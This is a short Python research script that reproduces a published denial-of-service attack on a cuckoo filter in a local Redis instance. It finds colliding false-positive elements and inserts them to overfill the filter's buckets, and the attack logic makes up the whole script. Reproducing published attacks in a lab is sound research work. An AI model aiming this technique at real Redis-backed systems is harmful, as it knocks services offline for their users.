# This script executes an attack to a cuckoo filter in Redis as described in this paper:
# P. Reviriego and D. Larrabeiti, “Denial of Service Attack on Cuckoo Filter based Networking Systems”, in IEEE Communications Letters (in press).


# Import th required modules
import redis
import random
from redisbloom.client import Client
from random import randint


#Setup our redis connection. It's on the VM, so local is fine.
pool = redis.ConnectionPool(host="127.0.0.1", port=6379, db=0)
r = redis.Redis(connection_pool=pool)


# Define variables
cfsize = 4096;
ielements = 1024;
offset = 123456789;
t = 5*1048576;
a = [];
b = [];
i = 0;


# Test Element
test_element = randint(ielements,offset-1);
filter_name = str(test_element);



# Create the Cuckoo Filter
r = Client()
r.cfCreate(filter_name, cfsize);


# Insert a fraction of the elements 
for x in range(1,ielements-1):
  r.cfAdd(filter_name, str(x));

# Test a large number of elements 
for x in range(offset,t+offset):
  pos = r.cfExists(filter_name, str(x));
  #print(pos,x)
  if pos == 0:
      a.append(x) 

# Print FPR and set size
print("The length of list A is: ", len(a))
print("The FPR: ", 100*((t)-len(a))/(t))



# Insert a test element
#
r.cfAdd(filter_name, test_element);
   
# Test the elements in a
for x in a:
  i = i+1;
  pos = r.cfExists(filter_name, str(x));
  if pos == 1:
    b.append(x);
    if len(b) == 8:
      print(i)
#      break

print("The length of list B is: ", len(b))

# Attack commented to loop
for x in b:
  res = r.cfAdd(filter_name, str(x));
  print(res,x)


